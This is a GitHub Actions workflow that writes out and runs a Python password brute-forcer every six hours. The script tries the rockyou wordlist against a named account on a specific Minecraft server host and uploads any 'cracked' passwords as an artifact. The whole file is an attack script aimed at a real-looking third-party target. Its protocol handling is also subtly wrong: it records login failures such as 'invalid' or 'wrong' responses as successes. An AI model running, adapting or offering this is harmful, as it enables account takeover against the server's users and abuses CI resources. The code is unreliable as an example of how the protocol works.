name: Cargq Cracker

# Trigger manually or via schedule
on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *' 

jobs:
  crack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Download wordlist
        run: |
          wget https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz
          gunzip rockyou.txt.gz

      - name: Run Script
        env:
          MC_IP: nyvexsmp.playwithbao.com
          LOGIN_TARGET: cargq
        run: |
          cat > brute.py << 'EOF'
          import socket
          import threading
          import time
          import struct
          import os

          # --- CONFIGURATION ---
          MC_IP = "nyvexsmp.playwithbao.com"
          MC_PORT = 25565
          USERNAME = "cargq"
          WORDLIST_FILE = "rockyou.txt"
          OUTPUT_FILE = "cracked_passwords.txt"

          # Global variables
          server_socket = None
          failure_lock = threading.Lock()
          breaks_found = 0
          wordlist = []

          def load_wordlist():
              """Load passwords from text file into memory."""
              print(f"[*] Loading wordlist from {WORDLIST_FILE}...")
              try:
                  with open(WORDLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
                      wl = [line.strip() for line in f if line.strip()]
                  print(f"[*] Loaded {len(wl)} passwords.")
                  return wl
              except FileNotFoundError:
                  print(f"[-] {WORDLIST_FILE} not found. Creating dummy wordlist...")
                  with open(WORDLIST_FILE, "w") as f:
                      f.write("123456\n123456789\npassword\nadmin\ntest\nletmein\nwelcome\n000000\n")
                  with open(WORDLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
                      wl = [line.strip() for line in f if line.strip()]
                  return wl

          def connect_to_server():
              """Connect to target IP and handle initial handshake."""
              global server_socket
              try:
                  server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  server_socket.settimeout(5)
                  server_socket.connect((MC_IP, MC_PORT))
                  return True
              except Exception as e:
                  print(f"[-] Connection failed: {e}")
                  return False

          def attempt_login(username, password):
              """Send password packet."""
              try:
                  u_bytes = username.encode('utf-8')
                  length_prefix = struct.pack('>I', len(password))
                  payload = length_prefix + password.encode('utf-8') + u_bytes + b'\0'
                  server_socket.send(payload)
              except Exception:
                  pass

          def worker(wl):
              """Thread worker to test passwords."""
              global breaks_found
              
              for password in wl:
                  if not connect_to_server():
                      time.sleep(1)
                      continue

                  try:
                      u_bytes = USERNAME.encode('utf-8')
                      msg = struct.pack('>I', (2 << 24) | len(u_bytes)) + b'\x02' + u_bytes
                      server_socket.send(msg)
                      time.sleep(0.2)
                      
                      attempt_login(USERNAME, password)
                      time.sleep(0.3)
                      
                      response = server_socket.recv(1024).decode('utf-8', errors='ignore')
                      if any(err in response.lower() for err in ["invalid", "bad", "wrong", "success", "logged"]):
                          with failure_lock:
                              breaks_found += 1
                              print(f"\n[!] RESULT: {USERNAME} | PASSWORD: {password} | Resp: {response}")
                              with open(OUTPUT_FILE, 'a') as f:
                                  f.write(f"{USERNAME}:{password}\n")
                          break
                  except Exception:
                      pass
                  finally:
                      try:
                          server_socket.close()
                      except:
                          pass
                  time.sleep(0.05)

          def main():
              global wordlist
              wordlist = load_wordlist()
              if not wordlist:
                  print("[-] Wordlist is empty.")
                  return

              print(f"\n[*] Target: {MC_IP}")
              print(f"[*] Target Account: {USERNAME}")
              print(f"[*] Wordlist Size: {len(wordlist)}")

              t = threading.Thread(target=worker, args=(wordlist,))
              t.start()
              t.join()

              print(f"\n[*] Scan Complete.")
              if os.path.exists(OUTPUT_FILE):
                  print(f"[+] Passwords saved to {OUTPUT_FILE}")

          if __name__ == "__main__":
              main()
          EOF

          chmod +x brute.py
          python3 brute.py

      - name: Upload Passwords
        uses: actions/upload-artifact@v4
        with:
          name: passwords
          path: cracked_passwords.txt
          
